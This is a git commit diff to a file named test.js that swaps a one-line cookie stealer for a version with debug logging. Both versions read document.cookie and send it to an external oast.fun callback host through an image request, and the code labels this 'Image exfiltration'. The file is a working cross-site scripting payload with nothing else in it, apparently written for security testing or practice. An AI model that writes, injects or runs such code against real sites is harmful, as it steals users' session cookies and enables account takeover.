b52e7eb5a2a3c81cf4cd7ba5a36e9385ce7d701f
roland_hack <roland-hack@epitech.eu>
2025-05-07 19:07:50 +0100

    kkkdkds

--- test.js
+++ test.js
@@ -1,2 +1,13 @@
-// test.js
-new Image().src = 'https://kwzvnipoylejwhfgszax4idsmvlc0jrjt.oast.fun/?cookie=' + encodeURIComponent(document.cookie);
+console.log('[DEBUG] Script exécuté');
+
+try {
+    const cookie = document.cookie;
+    console.log('[DEBUG] Cookie lu :', cookie);
+
+    const img = new Image();
+    img.src = 'https://kwzvnipoylejwhfgszax4idsmvlc0jrjt.oast.fun/?cookie=' + encodeURIComponent(cookie);
+
+    console.log('[DEBUG] Image exfiltration lancée');
+} catch (err) {
+    console.error('[DEBUG] Erreur dans le script :', err);
+}
